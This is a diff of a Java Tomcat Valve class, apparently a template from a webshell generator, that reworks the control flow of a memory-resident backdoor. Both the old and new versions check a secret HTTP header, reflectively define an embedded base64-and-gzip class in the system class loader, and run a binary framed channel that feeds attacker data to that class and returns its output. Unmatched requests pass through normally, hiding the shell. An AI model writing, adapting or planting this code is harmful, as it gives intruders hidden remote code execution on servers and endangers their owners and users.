@@ -57,75 +57,75 @@ public class LeoValveChunkTpl implements Valve {
     public void invoke(Request req, Response resp) throws IOException, ServletException {
         HttpServletRequest request = (HttpServletRequest) req;
         HttpServletResponse response = (HttpServletResponse) resp;
-        try {
-            if (request.getHeader(headerName) != null
-                    && request.getHeader(headerName).contains(headerValue)) {
-                response.setStatus(respCode);
-                response.setHeader("X-Accel-Buffering", "no");
-                response.setHeader("Connection", "keep-alive");
-                response.setContentType("application/octet-stream");
-                response.setBufferSize(8192);
-
-                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-                byte[] buffer = new byte[1024];
-                int bytesRead;
-                try {
-                    Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
-                } catch (ClassNotFoundException e) {
-                    GZIPInputStream gzipInputStream = new GZIPInputStream(
-                            new ByteArrayInputStream(base64Decode(coreClass)));
-                    while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
-                        byteArrayOutputStream.write(buffer, 0, bytesRead);
-                    }
-                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
-                            "defineClass",
-                            new Class[]{String.class, byte[].class, int.class, int.class});
-                    defineClassMethod.setAccessible(true);
-                    defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),
-                            new Object[]{null, byteArrayOutputStream.toByteArray(),
-                                    Integer.valueOf(0), Integer.valueOf(byteArrayOutputStream.size())});
-                }
-
-                DataInputStream dataInputStream = new DataInputStream(request.getInputStream());
-                DataOutputStream dataOutputStream = new DataOutputStream(response.getOutputStream());
-                dataOutputStream.flush();
-
-                while (true) {
-                    int frameType = dataInputStream.readUnsignedByte();
-                    long transportId = dataInputStream.readLong();
-                    int dataLen = dataInputStream.readInt();
-                    if (dataLen < 0 || dataLen > 16777216) break;
-                    byte[] data = new byte[dataLen];
-                    dataInputStream.readFully(data);
-                    if (frameType == 4) break;
-                    if (frameType == 3) continue;
-                    int responseType;
-                    byte[] respData;
-                    if (frameType == 2 && dataLen == 0) {
-                        responseType = 3;
-                        respData = new byte[0];
-                    } else if (frameType == 1) {
-                        responseType = 1;
-                        byteArrayOutputStream = new ByteArrayOutputStream();
-                        byteArrayOutputStream.write(data);
-                        Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
-                                .newInstance().equals(byteArrayOutputStream);
-                        respData = byteArrayOutputStream.toByteArray();
-                    } else {
-                        break;
-                    }
-                    if (respData.length > 16777216) break;
-                    dataOutputStream.writeByte(responseType);
-                    dataOutputStream.writeLong(transportId);
-                    dataOutputStream.writeInt(respData.length);
-                    dataOutputStream.write(respData);
-                    dataOutputStream.flush();
-                }
-            } else {
-                this.getNext().invoke(req, resp);
-            }
-        } catch (Exception e) {
+        String actualHeader = request.getHeader(headerName);
+        if (actualHeader == null || !actualHeader.contains(headerValue)) {
             this.getNext().invoke(req, resp);
+            return;
+        }
+
+        try {
+            response.setStatus(respCode);
+            response.setHeader("X-Accel-Buffering", "no");
+            response.setHeader("Connection", "keep-alive");
+            response.setContentType("application/octet-stream");
+            response.setBufferSize(8192);
+
+            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+            byte[] buffer = new byte[1024];
+            int bytesRead;
+            try {
+                Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
+            } catch (ClassNotFoundException e) {
+                GZIPInputStream gzipInputStream = new GZIPInputStream(
+                        new ByteArrayInputStream(base64Decode(coreClass)));
+                while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
+                    byteArrayOutputStream.write(buffer, 0, bytesRead);
+                }
+                Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
+                        "defineClass",
+                        new Class[]{String.class, byte[].class, int.class, int.class});
+                defineClassMethod.setAccessible(true);
+                defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),
+                        new Object[]{null, byteArrayOutputStream.toByteArray(),
+                                Integer.valueOf(0), Integer.valueOf(byteArrayOutputStream.size())});
+            }
+
+            DataInputStream dataInputStream = new DataInputStream(request.getInputStream());
+            DataOutputStream dataOutputStream = new DataOutputStream(response.getOutputStream());
+            dataOutputStream.flush();
+
+            while (true) {
+                int frameType = dataInputStream.readUnsignedByte();
+                long transportId = dataInputStream.readLong();
+                int dataLen = dataInputStream.readInt();
+                if (dataLen < 0 || dataLen > 16777216) break;
+                byte[] data = new byte[dataLen];
+                dataInputStream.readFully(data);
+                if (frameType == 4) break;
+                if (frameType == 3) continue;
+                int responseType;
+                byte[] respData;
+                if (frameType == 2 && dataLen == 0) {
+                    responseType = 3;
+                    respData = new byte[0];
+                } else if (frameType == 1) {
+                    responseType = 1;
+                    byteArrayOutputStream = new ByteArrayOutputStream();
+                    byteArrayOutputStream.write(data);
+                    Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
+                            .newInstance().equals(byteArrayOutputStream);
+                    respData = byteArrayOutputStream.toByteArray();
+                } else {
+                    break;
+                }
+                if (respData.length > 16777216) break;
+                dataOutputStream.writeByte(responseType);
+                dataOutputStream.writeLong(transportId);
+                dataOutputStream.writeInt(respData.length);
+                dataOutputStream.write(respData);
+                dataOutputStream.flush();
+            }
+        } catch (Exception ignored) {
         }
     }
 
